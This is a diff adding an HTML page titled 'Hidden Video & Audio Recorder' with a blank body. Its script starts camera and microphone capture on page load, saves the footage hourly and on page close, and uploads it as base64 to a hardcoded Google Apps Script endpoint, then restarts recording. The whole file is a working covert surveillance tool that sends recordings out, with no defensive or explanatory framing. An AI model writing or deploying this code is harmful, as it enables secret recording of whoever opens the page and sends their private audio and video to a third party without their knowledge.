@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hidden Video & Audio Recorder</title>
+</head>
+<body>
+
+    <script>
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        async function startRecording() {
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.start();
+
+                mediaRecorder.ondataavailable = event => {
+                    recordedChunks.push(event.data);
+                };
+
+                // Auto-save every 60 minutes
+                setInterval(saveRecording, 60 * 60 * 1000);
+
+                // Stop recording when browser closes
+                window.addEventListener("beforeunload", saveRecording);
+
+            } catch (err) {
+                console.log("Error accessing camera & microphone: " + err);
+            }
+        }
+
+        async function saveRecording() {
+            if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                mediaRecorder.stop();
+
+                let blob = new Blob(recordedChunks, { type: 'video/webm' });
+                let reader = new FileReader();
+                reader.readAsDataURL(blob);
+                reader.onloadend = async function () {
+                    let base64data = reader.result.split(',')[1];
+                    
+                    let formData = new FormData();
+                    formData.append("data", base64data);
+                    formData.append("filename", "recording_" + new Date().toISOString() + ".webm");
+                    formData.append("mimetype", "video/webm");
+
+                    let response = await fetch("https://script.google.com/macros/s/AKfycbwzYJ-jm6rBykmwcTVkor3rlCMGCP-M_Pvv6-lhea3sDsIPoT7JeKlj0iYa8cIz7j-F/exec", {
+                        method: "POST",
+                        body: formData
+                    });
+
+                    let result = await response.text();
+                    console.log(result);
+                };
+
+                // Restart recording
+                recordedChunks = [];
+                startRecording();
+            }
+        }
+
+        // Start recording when page loads
+        startRecording();
+    </script>
+
+</body>
+</html>
